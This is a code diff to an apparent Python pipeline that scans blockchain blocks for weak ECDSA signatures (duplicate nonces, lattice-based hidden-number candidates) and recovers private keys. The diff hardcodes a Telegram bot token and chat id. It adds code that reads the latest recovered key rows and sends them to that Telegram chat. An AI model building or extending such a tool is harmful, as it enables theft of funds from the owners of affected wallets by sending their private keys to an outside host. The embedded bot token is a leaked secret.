@@ -215,6 +215,16 @@ def count_lines(path: Path) -> int:
         return sum(1 for line in f if line.strip())
 
 
+def tail_nonempty_lines(path: Path, limit: int) -> list[str]:
+    if limit <= 0 or not path.exists():
+        return []
+    with path.open("r", encoding="utf-8") as f:
+        lines = [line.strip() for line in f if line.strip()]
+    if not lines:
+        return []
+    return lines[-limit:]
+
+
 def main() -> None:
     ap = argparse.ArgumentParser(description="Run download + recover in deterministic batches")
     ap.add_argument("--start-height", type=int, default=1, help="Initial block height")
@@ -253,7 +263,7 @@ def main() -> None:
                     help="Stop pipeline when new recovered key rows appear")
     ap.add_argument("--telegram-chat-id", default="7037604847",
                     help="Telegram chat id for alerts")
-    ap.add_argument("--telegram-bot-token", default="",
+    ap.add_argument("--telegram-bot-token", default="8249251869:AAHpYzEGTDx2u25h5RjAARL5-50sld3Dgws",
                     help="Telegram bot token; if empty uses TELEGRAM_BOT_TOKEN env var")
     ap.add_argument("--python", default=sys.executable, help="Python executable")
     args = ap.parse_args()
@@ -344,6 +354,8 @@ def main() -> None:
         decision_obj = {}
         decision_path = Path(args.decision_report)
         audit_path = Path(args.audit_report)
+        hnp_candidates_path = Path("hnp_lll_bkz_candidates.txt")
+        hnp_candidate_count = count_lines(hnp_candidates_path)
         if decision_path.exists():
             try:
                 d = json.loads(decision_path.read_text(encoding="utf-8"))
@@ -355,15 +367,35 @@ def main() -> None:
                     or int(d.get("risk_score", 0)) >= args.risk_threshold
                 ):
                     anomaly_fingerprint_value = anomaly_fingerprint(d)
+                    vq = d.get("verification_quality", {}) or {}
+                    stage0 = d.get("stage0_subset", {}) or {}
+                    stage_runs = d.get("recover_stages", []) or []
+                    stage_names = ",".join(str(s.get("name", "?")) for s in stage_runs) if stage_runs else "none"
+                    invalid_ratio = vq.get("invalid_ratio")
+                    invalid_ratio_str = f"{float(invalid_ratio):.4f}" if isinstance(invalid_ratio, (int, float)) else "n/a"
                     anomaly_alert = (
                         "Critical anomaly signal.\n"
                         f"cycle={cycle}\n"
+                        f"start_height={current_start}\n"
                         f"risk_score={d.get('risk_score')}\n"
                         f"risk_verdict={d.get('risk_verdict')}\n"
+                        f"duplicate_r={d.get('duplicate_r')}\n"
                         f"cross_pub_duplicate_r={d.get('cross_pub_duplicate_r')}\n"
                         f"drift_flags={d.get('drift_flags')}\n"
                         f"sighash_anomaly={d.get('sighash_anomaly')}\n"
+                        f"fusion_tier={d.get('signal_fusion_tier')}\n"
+                        f"fusion_conf={d.get('signal_fusion_confidence')}\n"
+                        f"fusion_recommendation={d.get('signal_fusion_recommendation')}\n"
+                        f"verifiable={vq.get('verifiable')}\n"
+                        f"invalid={vq.get('invalid')}\n"
+                        f"invalid_ratio={invalid_ratio_str}\n"
                         f"recover_executed={d.get('recover_executed')}\n"
+                        f"recover_input={d.get('recover_input')}\n"
+                        f"recover_stages={stage_names}\n"
+                        f"cluster_gating_used={d.get('cluster_gating_used')}\n"
+                        f"stage0_selected={stage0.get('selected_signatures')}\n"
+                        f"stage0_nontrivial_groups={stage0.get('nontrivial_duplicate_r_groups')}\n"
+                        f"hnp_candidates={hnp_candidate_count}\n"
                     )
             except Exception as e:
                 print(f"[warn] failed to parse decision report: {e}")
@@ -395,13 +427,17 @@ def main() -> None:
 
         if new_rows > 0:
             if bot_token:
+                new_key_lines = tail_nonempty_lines(Path(args.recovered), min(new_rows, 5))
+                key_block = "\n".join(new_key_lines) if new_key_lines else "n/a"
                 msg = (
                     "Recovered new rows.\n"
                     f"cycle={cycle}\n"
                     f"start_height={current_start}\n"
                     f"batch_size={args.batch_size}\n"
                     f"new_rows={new_rows}\n"
-                    f"total_rows={after_recovered}"
+                    f"total_rows={after_recovered}\n"
+                    "latest_recovered_rows:\n"
+                    f"{key_block}"
                 )
                 ok = send_telegram_message(bot_token, args.telegram_chat_id, msg)
                 print(f"Telegram alert sent={ok} chat_id={args.telegram_chat_id}")
